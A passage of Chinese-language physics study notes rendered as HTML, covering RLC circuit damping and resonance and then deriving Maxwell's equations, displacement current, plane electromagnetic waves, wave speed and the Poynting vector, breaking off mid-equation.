<div class="arithmatex">\[
R^2 = \frac{4L}{C}
\]</div>
<p>此时为临界阻尼震荡</p>
<div class="arithmatex">\[
    q = (A+Bt)e^{-\frac{R}{2L}t}+C\varepsilon
\]</div>
<p>图像与过阻尼相似,但是震荡得更快</p>
<p><strong>欠阻尼</strong></p>
<p>当</p>
<div class="arithmatex">\[
R^2 &lt; \frac{4L}{C}
\]</div>
<p>此时为欠阻尼震荡</p>
<p>做振幅不断减小的振动</p>
<figure>
  <img align="align" alt="Image title" src="../NOTE/Physics/img/lightdamping.png" />
<br />
<figcaption>light damping</figcaption>
</figure>
<p><strong>受迫振动和共振</strong></p>
<p>如果外加电压为交流电，当变化频率与电路固有频率相同时，电路会发生共振</p>
<figure>
  <img align="align" alt="Image title" src="../NOTE/Physics/img/forceos.png" />
<br />
<figcaption>共振</figcaption>
</figure>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>普通的天线无法同时接受很多的信号，如果很多人一起打电话，那么电线就会瘫痪掉，但是如果使用的是超导体天线，电阻很小，其振幅的宽度很小很小，不用担心共振的问题</p>
</div>
<p>最后，附上本人普通物理学(I)有关阻尼震荡的笔记，<del>有空再敲上来吧</del></p>
<div class="card file-block">
<div class="file-icon"><img src="../static/images/pdf.svg" style="height: 3em;"></div>
<div class="file-body">
<div class="file-title">振动方程推导</div>
<div class="file-meta"></div>
</div>
<p><a class="down-button" target="_blank" href="../NOTE/Physics/img/phy.pdf"  markdown="1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M288 32c0-17.7-14.3-32-32-32s-32 14.3-32 32v242.7l-73.4-73.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l128 128c12.5 12.5 32.8 12.5 45.3 0l128-128c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L288 274.7zM64 352c-35.3 0-64 28.7-64 64v32c0 35.3 28.7 64 64 64h384c35.3 0 64-28.7 64-64v-32c0-35.3-28.7-64-64-64H346.5l-45.3 45.3c-25 25-65.5 25-90.5 0L165.5 352zm368 56a24 24 0 1 1 0 48 24 24 0 1 1 0-48"/></svg></span> 查看</a></p>
</div></section><section class="print-page" id="note-physics-maxwell" heading-number="2.3.4.5"><h1 id="note-physics-maxwell-maxwell-equation">Maxwell Equation<a class="headerlink" href="#note-physics-maxwell-maxwell-equation" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3735 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 14 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 13 分钟</p>
</div>
<blockquote>
<p>改变人类文明进程的伟大方程(我了个豆，敲LaTeX真累啊)</p>
</blockquote>
<h2 id="note-physics-maxwell-_1">对称性原则<a class="headerlink" href="#note-physics-maxwell-_1" title="Permanent link">&para;</a></h2>
<p>我们首先回忆学过的方程</p>
<p>在真空中，我们有</p>
<ul>
<li>电场高斯定理</li>
</ul>
<div class="arithmatex">\[
    \oiint \boldsymbol{E} \cdot \boldsymbol{dS} = \frac{Q}{\varepsilon_0}
\]</div>
<ul>
<li>磁场高斯定理</li>
</ul>
<div class="arithmatex">\[
    \oiint \boldsymbol{B} \cdot \boldsymbol{dS} = 0
\]</div>
<ul>
<li>法拉第电磁感应定律</li>
</ul>
<div class="arithmatex">\[
    \oint \boldsymbol{E} \cdot \boldsymbol{dl} = -\frac{d\Phi_B}{dt} = -\iint \frac{\partial \boldsymbol{B}}{\partial t} \cdot \boldsymbol{dS}
\]</div>
<ul>
<li>安培环路定理</li>
</ul>
<div class="arithmatex">\[
    \oint \boldsymbol{B} \cdot \boldsymbol{dl} = \mu_0 I_{enc}
\]</div>
<p>在电介质或者磁芯材料中，我们有</p>
<ul>
<li>电场高斯定理推广</li>
</ul>
<div class="arithmatex">\[
    \oiint \boldsymbol{D} \cdot \boldsymbol{dS} = Q_{free}
\]</div>
<ul>
<li>磁场环路定理推广</li>
</ul>
<div class="arithmatex">\[
    \oint \boldsymbol{H} \cdot \boldsymbol{dl} = I_{free} = \oiint \boldsymbol{J} \cdot \boldsymbol{dS}
\]</div>
<p>我们还有欧姆定律微分形式</p>
<div class="arithmatex">\[
    \boldsymbol{J} = \sigma \boldsymbol{E}
\]</div>
<p><mark class="critic">对称性原则</mark>：物理学家们希望方程是对称美观的，观察电场和磁场的高斯定律，于是自然不想看到磁场高斯定律的等号右边空空如也，也希望电场环路定律出现电流的形式，所以引入了磁荷<span class="arithmatex">\(q_m\)</span>对方程进行修正</p>
<div class="arithmatex">\[
    \begin{cases}
    \oiint \boldsymbol{B} \cdot \boldsymbol{dS} = q_m \\
    \oint \boldsymbol{E} \cdot \boldsymbol{dl} = \dfrac{dq_m}{dt} -\oiint \dfrac{\partial \boldsymbol{B}}{\partial t} \cdot \boldsymbol{dS}
    \end{cases} 
\]</div>
<h2 id="note-physics-maxwell-stokez">Stokez公式与麦克斯韦方程<a class="headerlink" href="#note-physics-maxwell-stokez" title="Permanent link">&para;</a></h2>
<blockquote>
<p>我宣佈現在我也是麥克斯韋了</p>
</blockquote>
<div align=center>
    <img src="../NOTE/Physics/img/looplaw.png" width="50%">
</div>

<p>使用电场的环路定理，再用斯托克斯公式变成面积分</p>
<div class="arithmatex">\[
\oint \boldsymbol{H} \cdot d\boldsymbol{l} = i_0 = \iint_{S_2} \boldsymbol{J}_0 \cdot d\boldsymbol{A}
\]</div>
<div class="arithmatex">\[
-\iint_{S_1} \boldsymbol{J}_0 \cdot d\boldsymbol{A} = \iint_{S_2} \boldsymbol{J}_0 \cdot d\boldsymbol{A} = i_0
\]</div>
<div class="arithmatex">\[
\iint_{S} \boldsymbol{J}_0 \cdot d\boldsymbol{A} = \iint_{S_1} \boldsymbol{J}_0 \cdot d\boldsymbol{A} + \iint_{S_2} \boldsymbol{J}_0 \cdot d\boldsymbol{A} = 0
\]</div>
<p>这启发我们，以一个封闭的曲面包裹着电流，其面积分为0；</p>
<p>但是这样的结论在给电容器充电时出现了诡异的情况</p>
<div align=center>
    <img src="../NOTE/Physics/img/chargec.png" width="50%">
</div>

<p>对于(1,2)曲面，面积分为0，(1,4)曲面，面积分为0，但是(1,3)曲面，面积分不为0，此时电流从1面进入，但是没有从3面出去；这太不自然了</p>
<p>所以我们自然引入位移电流<span class="arithmatex">\(I_D\)</span></p>
<div class="arithmatex">\[
   \oint \boldsymbol{H} \cdot \boldsymbol{dl} = I_{free} + I_D
\]</div>
<p>但是<span class="arithmatex">\(I_D\)</span>是什么呢？我们可以从面积分的形式出发</p>
<p>考虑(1,3)曲面<span class="arithmatex">\(S\)</span>，只进不出</p>
<div class="arithmatex">\[
    \oiint_S \boldsymbol{J} \cdot \boldsymbol{dS} = -\dfrac{dq}{dt}
\]</div>
<div class="arithmatex">\[
    \oiint_S \boldsymbol{D} \cdot \boldsymbol{dS} = q
\]</div>
<div class="arithmatex">\[
    \oiint_s \dfrac{\partial \boldsymbol{D}}{\partial t} \cdot \boldsymbol{dS} = \dfrac{dq}{dt}
\]</div>
<p>所以在(1,3)曲面上，我们有</p>
<div class="arithmatex">\[
    \oiint_S \left( \boldsymbol{J} + \dfrac{\partial \boldsymbol{D}}{\partial t} \right) \cdot \boldsymbol{dS} = 0
\]</div>
<p>此时在1曲面进的等于3曲面出的</p>
<div class="arithmatex">\[
    - \oiint_{S_1} \boldsymbol{J} \cdot \boldsymbol{dS} = \oiint_{S_3} \boldsymbol{J} \cdot \boldsymbol{dS} 
\]</div>
<div class="admonition key-point">
<p class="admonition-title">位移电流</p>
<p>1曲面没有位移电流，3曲面没有自由电流，位移电流<span class="arithmatex">\(I_D=I_0\)</span></p>
</div>
<p>最后，更加完整的定义为</p>
<div class="arithmatex">\[
\Phi_D = \iint \boldsymbol{D} \cdot d\boldsymbol{A} \quad \text{electric displacement flux}
\]</div>
<div class="arithmatex">\[
i_D = \frac{d\Phi_D}{dt} = \iint \frac{\partial \boldsymbol{D}}{\partial t} \cdot d\boldsymbol{A} \quad \text{displacement current}
\]</div>
<div class="arithmatex">\[
\boldsymbol{j}_D = \frac{\partial \boldsymbol{D}}{\partial t} \quad \text{displacement current density}
\]</div>
<p>分别是电位移通量，位移电流，位移电流密度</p>
<div class="admonition proof">
<p class="admonition-title">i_D=i_0</p>
<div class="arithmatex">\[
E = \frac{\sigma_e}{\epsilon_0} = \frac{q}{\epsilon_0 A} \quad \therefore \quad q = \epsilon_0 A E = \epsilon_0 \Phi_E = AD
\]</div>
<div class="arithmatex">\[
\therefore \quad i_0 = \frac{dq}{dt} = \epsilon_0 \frac{d\Phi_E}{dt} = \frac{d\Phi_D}{dt} = i_D, \quad \boldsymbol{D} = \epsilon_0 \boldsymbol{E}
\]</div>
</div>
<p>电容充满电之后<span class="arithmatex">\(i_D=i_0=0\)</span>;</p>
<p>这个电流也会产生磁场</p>
<p><img align="left" alt="" src="../NOTE/Physics/img/maxwell1.png" /> </p>
<p><img align="right" alt="" src="../NOTE/Physics/img/maxwell2.png" /></p>
<div class="arithmatex">\[
\oint \boldsymbol{H} \cdot d\boldsymbol{l} = \int \int \frac{\partial \boldsymbol{D}}{\partial t} \cdot d\boldsymbol{A}  \enspace  (I_D)
\]</div>
<div class="arithmatex">\[
\oint \frac{\boldsymbol{B}}{\mu_0} \cdot d\boldsymbol{l} = \epsilon_0 \int \int \frac{\partial \boldsymbol{E}}{\partial t} \cdot dA
\]</div>
<div class="arithmatex">\[
\oint \boldsymbol{B} \cdot d\boldsymbol{l} = \mu_0 \epsilon_0 \int \int \frac{\partial \boldsymbol{E}}{\partial t} \cdot dA
\]</div>
<p>变化的电场产生磁场，变化的磁场产生电场，这就是麦克斯韦方程</p>
<p>最后，我们得到</p>
<div class="arithmatex">\[
    \oint \boldsymbol{H} \cdot \boldsymbol{dl} = \iint \boldsymbol{J} \cdot \boldsymbol{dS} + \iint \frac{\partial \boldsymbol{D}}{\partial t} \cdot \boldsymbol{dS}
\]</div>
<p>以及</p>
<div class="arithmatex">\[
    \nabla \times \boldsymbol{H} = \boldsymbol{J} + \frac{\partial \boldsymbol{D}}{\partial t}
\]</div>
<h2 id="note-physics-maxwell-_2">电磁波<a class="headerlink" href="#note-physics-maxwell-_2" title="Permanent link">&para;</a></h2>
<p>我们可以从麦克斯韦方程推导出电磁波的性质</p>
<p>积分形式：</p>
<div class="arithmatex">\[
\oiint \boldsymbol{E} \cdot d\boldsymbol{A} = \frac{q_0}{\epsilon_0}
\]</div>
<div class="arithmatex">\[
\oiint \boldsymbol{B} \cdot d\boldsymbol{A} = 0
\]</div>
<div class="arithmatex">\[
\oint \boldsymbol{E} \cdot d\boldsymbol{l} = -\iint \frac{\partial \boldsymbol{B}}{\partial t} \cdot d\boldsymbol{A}
\]</div>
<div class="arithmatex">\[
\oint \boldsymbol{H} \cdot d\boldsymbol{l} = i_0 + \iint \frac{\partial \boldsymbol{D}}{\partial t} \cdot d\boldsymbol{A}
\]</div>
<p>微分形式（自由空间：<span class="arithmatex">\(\rho_0 = 0, \boldsymbol{J}_0 = 0\)</span>）：</p>
<div class="arithmatex">\[
\nabla \cdot \boldsymbol{E} = 0
\]</div>
<div class="arithmatex">\[
\nabla \times \boldsymbol{E} = -\frac{\partial \boldsymbol{B}}{\partial t} = - \kappa_m \mu_0 \frac{\partial \boldsymbol{H}}{\partial t}
\]</div>
<div class="arithmatex">\[
\nabla \cdot \boldsymbol{H} = 0
\]</div>
<div class="arithmatex">\[
\nabla \times \boldsymbol{H} = \kappa_e \epsilon_0 \frac{\partial \boldsymbol{E}}{\partial t}
\]</div>
<p>分量形式：</p>
<div class="arithmatex">\[
\frac{\partial E_x}{\partial x} + \frac{\partial E_y}{\partial y} + \frac{\partial E_z}{\partial z} = 0
\]</div>
<div class="arithmatex">\[
\begin{vmatrix}
\hat{i} &amp; \hat{j} &amp; \hat{k} \\
\frac{\partial}{\partial x} &amp; \frac{\partial}{\partial y} &amp; \frac{\partial}{\partial z} \\
E_x &amp; E_y &amp; E_z
\end{vmatrix} = -\kappa_m \mu_0 \left(
\frac{\partial H_x}{\partial t} \hat{i} +
\frac{\partial H_y}{\partial t} \hat{j} +
\frac{\partial H_z}{\partial t} \hat{k}
\right)
\]</div>
<div class="arithmatex">\[
\frac{\partial H_x}{\partial x} + \frac{\partial H_y}{\partial y} + \frac{\partial H_z}{\partial z} = 0
\]</div>
<div class="arithmatex">\[
\begin{vmatrix}
\hat{i} &amp; \hat{j} &amp; \hat{k} \\
\frac{\partial}{\partial x} &amp; \frac{\partial}{\partial y} &amp; \frac{\partial}{\partial z} \\
H_x &amp; H_y &amp; H_z
\end{vmatrix} = \kappa_e \epsilon_0 \left(
\frac{\partial E_x}{\partial t} \hat{i} +
\frac{\partial E_y}{\partial t} \hat{j} +
\frac{\partial E_z}{\partial t} \hat{k}
\right)
\]</div>
<h3 id="note-physics-maxwell-_3">平面波<a class="headerlink" href="#note-physics-maxwell-_3" title="Permanent link">&para;</a></h3>
<p>首先，假设单一波源，在很远的自由空间中，在球面上取一弧面，可以近似为平面波；以其传播方向为<span class="arithmatex">\(z\)</span>轴，电场和磁场分别为<span class="arithmatex">\(x\)</span>和<span class="arithmatex">\(y\)</span>轴</p>
<div align=center>
    <img src="../NOTE/Physics/img/mx1.png" width="50%">
</div>

<p>将上面的式子依次展开，得到以下8个方程</p>
<div class="arithmatex">\[\begin{align*}
    \frac{\partial E_x}{\partial x} + \frac{\partial E_y}{\partial y} + \frac{\partial E_z}{\partial z} &amp;= 0 \tag{1} \\
    \frac{\partial E_z}{\partial y} - \frac{\partial E_y}{\partial z} &amp;= -\kappa_m \mu_0 \frac{\partial H_x}{\partial t} \tag{2-1} \\
    \frac{\partial E_x}{\partial z} - \frac{\partial E_z}{\partial x} &amp;= -\kappa_m \mu_0 \frac{\partial H_y}{\partial t} \tag{2-2} \\
    \frac{\partial E_y}{\partial x} - \frac{\partial E_x}{\partial y} &amp;= -\kappa_m \mu_0 \frac{\partial H_z}{\partial t} \tag{2-3} \\
    \frac{\partial H_x}{\partial x} + \frac{\partial H_y}{\partial y} + \frac{\partial H_z}{\partial z} &amp;= 0 \tag{3} \\
    \frac{\partial H_z}{\partial y} - \frac{\partial H_y}{\partial z} &amp;= \kappa_e \epsilon_0 \frac{\partial E_x}{\partial t} \tag{4-1} \\
    \frac{\partial H_x}{\partial z} - \frac{\partial H_z}{\partial x} &amp;= \kappa_e \epsilon_0 \frac{\partial E_y}{\partial t} \tag{4-2} \\
    \frac{\partial H_y}{\partial x} - \frac{\partial H_x}{\partial y} &amp;= \kappa_e \epsilon_0 \frac{\partial E_z}{\partial t} \tag{4-3}
\end{align*}\]</div>
<p>接下来，运用这八个方程，一步步推导出电磁波的性质</p>
<h3 id="note-physics-maxwell-_4">横波<a class="headerlink" href="#note-physics-maxwell-_4" title="Permanent link">&para;</a></h3>
<p>首先，我们有，在<span class="arithmatex">\(x\)</span>和<span class="arithmatex">\(y\)</span>方向的电场强度和磁场强度都是一样的，不会变化；所以</p>
<div class="arithmatex">\[
   \dfrac{\partial E_x}{\partial x} = \dfrac{\partial E_y}{\partial y} = \dfrac{\partial H_x}{\partial x} = \dfrac{\partial H_y}{\partial y} = 0
\]</div>
<p>由 (1) 式，我们有</p>
<div class="arithmatex">\[
    \dfrac{\partial E_z}{\partial z} = 0
\]</div>
<p>由 (2-3) 式，我们有</p>
<div class="arithmatex">\[
    \dfrac{\partial H_z}{\partial t} = 0 
\]</div>
<p>由 (3) 式，我们有</p>
<div class="arithmatex">\[
    \dfrac{\partial H_z}{\partial z} = 0
\]</div>
<p>由 (4-3) 式，我们有</p>
<div class="arithmatex">\[
    \dfrac{\partial E_z}{\partial t} = 0
\]</div>
<p>所以电场和磁场随着z轴的变化是不变的，可以设为<span class="arithmatex">\(0\)</span></p>
<div class="arithmatex">\[
    E \perp k, H \perp k
\]</div>
<h3 id="note-physics-maxwell-e-perp-h"><span class="arithmatex">\(E \perp H\)</span><a class="headerlink" href="#note-physics-maxwell-e-perp-h" title="Permanent link">&para;</a></h3>
<p>运用<span class="arithmatex">\(E_z=H_z=0\)</span>，我们有</p>
<p>(2-1) 式</p>
<div class="arithmatex">\[
    \dfrac{\partial E_y}{\partial z} = \kappa_m \mu_0 \dfrac{\partial H_x}{\partial t}
\]</div>
<p>(2-2) 式</p>
<div class="arithmatex">\[
    \dfrac{\partial E_x}{\partial z} = -\kappa_m \mu_0 \dfrac{\partial H_y}{\partial t}
\]</div>
<p>(4-1) 式</p>
<div class="arithmatex">\[
    \dfrac{\partial H_y}{\partial z} = -\kappa_e \epsilon_0 \dfrac{\partial E_x}{\partial t}
\]</div>
<p>(4-2) 式</p>
<div class="arithmatex">\[
    \dfrac{\partial H_x}{\partial z} = \kappa_e \epsilon_0 \dfrac{\partial E_y}{\partial t}
\]</div>
<p>由于<span class="arithmatex">\(x,y\)</span>的方向是任意定的，那么我们可以设<span class="arithmatex">\(x\)</span>的方向就是电场的方向；那么我们有</p>
<div class="arithmatex">\[
    \dfrac{\partial H_x}{\partial z} = 0 =\dfrac{\partial H_x}{\partial t}
\]</div>
<p>所以磁场强度的方向与电场强度方向垂直，故<span class="arithmatex">\(E \perp H\)</span></p>
<h3 id="note-physics-maxwell-_5">波动方程<a class="headerlink" href="#note-physics-maxwell-_5" title="Permanent link">&para;</a></h3>
<blockquote>
<p>原来光就是电磁波</p>
</blockquote>
<p>对上面的四个方程中的(2-2)两边对<span class="arithmatex">\(t\)</span>求偏导</p>
<div class="arithmatex">\[
\frac{\partial^2 E_x}{\partial z^2} = -\kappa_m \mu_0 \frac{\partial}{\partial t} \cdot \frac{\partial H_y}{\partial z} = \kappa_m \mu_0 K_e \epsilon_0 \frac{\partial^2 E_x}{\partial t^2}
\]</div>
<p>同理，对(4-1)操作，得到以下两个方程</p>
<div class="arithmatex">\[\begin{align*}
\frac{\partial^2 E_x}{\partial z^2} - \kappa_e \epsilon_0 K_m \mu_0 \frac{\partial^2 E_x}{\partial t^2} &amp;= 0 \\
\frac{\partial^2 H_y}{\partial z^2} - \kappa_e \epsilon_0 K_m \mu_0 \frac{\partial^2 H_y}{\partial t^2} &amp;= 0
\end{align*}\]</div>
<p>猜根得到</p>
<div class="arithmatex">\[
    \begin{cases}
     E_x=E_{x0} e^{i(\omega t - kz)}\\
     H_y=H_{y0} e^{i(\omega t - kz)}\\
    \end{cases}
\]</div>
<p>带入方程，得到</p>
<div class="arithmatex">\[
    \begin{cases}
     k^2 = \kappa_e \epsilon_0 \kappa_m \mu_0 \omega^2\\
     k = \omega \sqrt{\kappa_e \epsilon_0 \kappa_m \mu_0}
    \end{cases} 
\]</div>
<p>又因为</p>
<div class="arithmatex">\[
    v=\dfrac{\omega}{k}= \dfrac{1}{\sqrt{\kappa_e \epsilon_0 \kappa_m \mu_0}}
\]</div>
<p>在真空中，磁导率和介电常数为1；代入数据计算发现，<span class="arithmatex">\(v=c=3.0 \times 10^8 m/s\)</span>，这就是光速</p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>詹姆斯·克拉克·麦克斯韦（James Clerk Maxwell）在1861年至1862年期间，通过他的电磁理论推导出了光速。他在发表于1865年的论文《电磁场的动力学理论》（<em>A Dynamical Theory of the Electromagnetic Field</em>）中系统地总结了这一成果。</p>
<p>麦克斯韦通过结合法拉第电磁感应定律、安培定律（修正后引入了位移电流）、高斯定律以及高斯磁定律，形成了一组描述电磁场的方程组，即后来被称为“麦克斯韦方程组”。在推导过程中，他注意到电磁波的传播速度与介质的电磁性质相关：</p>
<div class="arithmatex">\[
v = \frac{1}{\sqrt{\mu_0 \varepsilon_0}}
\]</div>
<p>当麦克斯韦使用当时已知的实验数据计算该值时，发现其结果接近于已知的光速（约 <span class="arithmatex">\( 3 \times 10^8 \, \text{m/s} \)</span>）。因此，他提出了一个革命性的假设：光是一种电磁波。这一发现是物理学史上的重要里程碑，将电磁学和光学统一在一个理论框架内。</p>
</div>
<p>而式子中余下的</p>
<div class="arithmatex">\[
    \sqrt{\kappa_e \kappa_m} = n
\]</div>
<p>即为折射率(光速在真空中的速度与介质中的速度的比值)</p>
<div class="arithmatex">\[
    v=\dfrac{c}{n}
\]</div>
<h3 id="note-physics-maxwell-_6">电场和磁场<a class="headerlink" href="#note-physics-maxwell-_6" title="Permanent link">&para;</a></h3>
<p>由推导电场与磁场相互垂直的(2-2)式<span class="arithmatex">\(\dfrac{\partial E_x}{\partial z} = -\kappa_m \mu_0 \dfrac{\partial H_y}{\partial t}\)</span>,继续将得出的电场和磁场代入，得到</p>
<div class="arithmatex">\[
\begin{align*}
-i k E_{x_0} e^{i(\omega t - kx)} &amp;= -\kappa_m \mu_0 i \omega H_{y_0} e^{i(\omega t - kx)} \\
k E_{x_0} &amp;= \kappa_m \mu_0 \omega H_{y_0} \\
E_{x_0} &amp;= \kappa_m \mu_0 \frac{\omega}{k} H_{y_0} = \kappa_m \mu_0 v H_{y_0} \\
&amp;= \kappa_m \mu_0 \frac{1}{\sqrt{\kappa_m \mu_0 \kappa_e \varepsilon_0}} H_{y_0} \\
\sqrt{\kappa_e \varepsilon_0} E_{x_0} &amp;= \sqrt{\kappa_m \mu_0} H_{y_0} \\
\sqrt{\kappa_e \varepsilon_0} E_{x_0} e^{i \phi_E} &amp;= \sqrt{\kappa_m \mu_0} H_{y_0} e^{i \phi_H}
\end{align*}
\]</div>
<p>初相相同</p>
<div class="arithmatex">\[
\begin{cases}
\sqrt{\kappa_e \varepsilon_0} E_0 = \sqrt{\kappa_m \mu_0} H_0 \\
\phi_E = \phi_H
\end{cases}
\]</div>
<p>在真空中，<span class="arithmatex">\(\kappa_e=\kappa_m=1\)</span></p>
<p>所以</p>
<div class="arithmatex">\[
    \sqrt{\varepsilon_0} E_0 = \sqrt{\mu_0} H_0
\]</div>
<div class="arithmatex">\[
    E_0 = \dfrac{\mu_0 H_0}{\sqrt{\varepsilon_0 \mu_0}}=cB_0
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<div class="arithmatex">\[
    B_0=\dfrac{E_0}{c}
\]</div>
<p>电场和磁场只差一个常数！</p>
</div>
<div align=center>
    <img src="../NOTE/Physics/img/mx3.png" width=80%/>
</div>

<h2 id="note-physics-maxwell-_7">电磁波的能量密度<a class="headerlink" href="#note-physics-maxwell-_7" title="Permanent link">&para;</a></h2>
<p>单位体积内电磁波的能量包括电场的部分和磁场的部分</p>
<div class="arithmatex">\[
U = \iiint \left( \frac{1}{2} \varepsilon_0 E^2 + \frac{1}{2} \frac{B^2}{\mu_0} \right) dv
\]</div>
<p>更一般的</p>
<div class="arithmatex">\[
U = U_E + U_B
= \iiint \left( \frac{1}{2} \boldsymbol{D} \cdot \boldsymbol{E} + \frac{1}{2} \boldsymbol{B} \cdot \boldsymbol{H} \right) dv
\]</div>
<div class="arithmatex">\[
\frac{dU}{dt} = \frac{d}{dt} \iiint \left( \frac{1}{2} \boldsymbol{D} \cdot \boldsymbol{E} + \frac{1}{2} \boldsymbol{B} \cdot \boldsymbol{H} \right) dv
\]</div>
<div class="arithmatex">\[
= \frac{1}{2} \iiint \frac{\partial}{\partial t} \left( \boldsymbol{D} \cdot \boldsymbol{E} + \boldsymbol{B} \cdot \boldsymbol{H} \right) dv
\]</div>
<p>展开：</p>
<div class="arithmatex">\[
\frac{\partial}{\partial t} \left( \boldsymbol{D} \cdot \boldsymbol{E} + \boldsymbol{B} \cdot \boldsymbol{H} \right) 
= \kappa_e \varepsilon_0 \frac{\partial}{\partial t} (\boldsymbol{E} \cdot \boldsymbol{E}) + \kappa_m \mu_0 \frac{\partial}{\partial t} (\boldsymbol{H} \cdot \boldsymbol{H})
\]</div>
<div class="arithmatex">\[
= 2 \kappa_e \varepsilon_0 \boldsymbol{E} \cdot \frac{\partial \boldsymbol{E}}{\partial t} + 2 \kappa_m \mu_0 \boldsymbol{H} \cdot \frac{\partial \boldsymbol{H}}{\partial t}
\]</div>
<mark class="critic block">
<div class="arithmatex">\[
= 2 \boldsymbol{E} \cdot \frac{\partial \boldsymbol{D}}{\partial t} + 2 \boldsymbol{H} \cdot \frac{\partial \boldsymbol{B}}{\partial t}
\]</div>
</mark>
<p>由麦克斯韦方程：</p>
<div class="arithmatex">\[
\frac{\partial \boldsymbol{D}}{\partial t} = \nabla \times \boldsymbol{H} - \boldsymbol{J_0}
\]</div>
<div class="arithmatex">\[
\frac{\partial \boldsymbol{B}}{\partial t} = -\nabla \times \boldsymbol{E}
\]</div>
<p>代入高亮部分后得到：</p>
<div class="arithmatex">\[
2 \boldsymbol{E} \cdot \left( \nabla \times \boldsymbol{H} - \boldsymbol{J_0} \right) - 2 \boldsymbol{H} \cdot \left( \nabla \times \boldsymbol{E} \right)
\]</div>
<div class="arithmatex">\[
= 2 \left[ \boldsymbol{E} \cdot (\nabla \times \boldsymbol{H}) - \boldsymbol{H} \cdot (\nabla \times \boldsymbol{E}) - \boldsymbol{J_0} \cdot \boldsymbol{E} \right]
\]</div>
<div class="arithmatex">\[
= -2 \nabla \cdot (\boldsymbol{E} \times \boldsymbol{H}) - 2 \boldsymbol{J_0} \cdot \boldsymbol{E}
\]</div>
<p>以上的化简运用了</p>
<div class="arithmatex">\[
\boldsymbol{E} \cdot (\nabla \times \boldsymbol{H}) - \boldsymbol{H} \cdot (\nabla \times \boldsymbol{E}) = - \nabla \cdot (\boldsymbol{E} \times \boldsymbol{H})
\]</div>
<p>最后运用高斯定理化简得到</p>
<div class="arithmatex">\[
\frac{dU}{dt} = - \iiint \nabla \cdot (\boldsymbol{E} \times \boldsymbol{H}) dv - \iiint (\boldsymbol{J_0} \cdot \boldsymbol{E}) dv
\]</div>
<mark class="critic block">
<div class="arithmatex">\[
= - \iint (\boldsymbol{E} \times \boldsymbol{H}) \cdot d\boldsymbol{A} - \iiint (\boldsymbol{J_0} \cdot \boldsymbol{E}) dv
\]</div>
</mark>
<p>接下来，我们继续讨论最后的<span class="arithmatex">\(J_0 \cdot E\)</span> 积分会得到什么</p>
<p>由于<span class="arithmatex">\(J_0 =\sigma (\boldsymbol{E}+\boldsymbol{K}) , \therefore \boldsymbol{E}=\dfrac{1}{\sigma} J_0 - \boldsymbol{K}\)</span></p>
<p>所以</p>
<p><img align="right" alt="" src="../NOTE/Physics/image-3.png" /></p>
<div class="arithmatex">\[
\begin{align*}
\int\int\int \left( \boldsymbol{j_0} \cdot \boldsymbol{E} \right) dv &amp; = \left( \boldsymbol{j_0} \cdot \boldsymbol{E} \right) \Delta A \cdot \Delta l \\
&amp; = \boldsymbol{j_0} \cdot \left( \rho \boldsymbol{j_0} - \boldsymbol{K} \right) \Delta A \cdot \Delta l \\
&amp; = \rho j_0^2 \Delta A \cdot \Delta l - \boldsymbol{j_0} \cdot \boldsymbol{K} \Delta A \cdot \Delta l \\
&amp; = \rho \frac{\Delta l}{\Delta A} \left( j_0 A \right)^2 - \left( j_0 A \right) \left( \boldsymbol{K} \cdot \Delta l \right) \\
&amp; = R i_0^2 - i_0 \Delta \varepsilon
&amp; = Q - P
\end{align*}
\]</div>
<p>最后得到单位时间内的能量为</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<div class="arithmatex">\[
    \dfrac{dU}{dt} = - \iint \boldsymbol{S} \cdot d\boldsymbol{A} - Q + P
\]</div>
</div>
<h3 id="note-physics-maxwell-poynting">Poynting 矢量<a class="headerlink" href="#note-physics-maxwell-poynting" title="Permanent link">&para;</a></h3>
<p>定义单位时间，单位面积内的能量流动</p>
<div class="arithmatex">\[
\boldsymbol{S} = \boldsymbol{E} \times \boldsymbol{H}
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<div class="arithmatex">\[
    S = \dfrac{EB}{\mu_0} = \dfrac{E^2}{\mu_0 c} = \dfrac{E^2}{Z_0}
\]</div>
<p>其中<span class="arithmatex">\(Z_0=377 \Omega\)</span></p>
<p>能量密度(单位时间，单位面积)为Poynting矢量的均值</p>
<p><div align=center>
<img src="../NOTE/Physics/img/mx4.png" width=60%/>
</div></p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>电场能量密度与磁场能量密度的关系</p>
<div class="arithmatex">\[
